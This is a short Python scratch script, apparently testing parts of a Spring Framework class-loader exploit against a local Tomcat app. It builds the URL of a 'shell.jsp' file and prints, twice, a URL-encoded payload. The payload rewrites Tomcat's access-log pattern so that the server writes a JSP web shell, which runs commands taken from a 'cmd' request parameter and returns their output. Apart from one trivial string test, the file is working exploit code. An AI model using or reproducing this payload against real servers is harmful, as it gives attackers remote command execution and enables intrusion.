from urllib.parse import urlparse

url = 'http://localhost:8080/handling-form-submission-complete/greeting'
directory = "webapps/handling-form-submission-complete"
filename = "shell"
res = urlparse(url)
print(res.scheme + '://' + res.netloc + '/' + directory.split("/")[1] +'/' + filename + '.jsp')
dir1 = "abc"

str1 = "abc" \
       "def"
print(str1)

log_pattern1 = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
           f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
           f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
           f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
print(log_pattern1)

log_pattern2 = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
           f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
           f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
           f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"
print(log_pattern2)

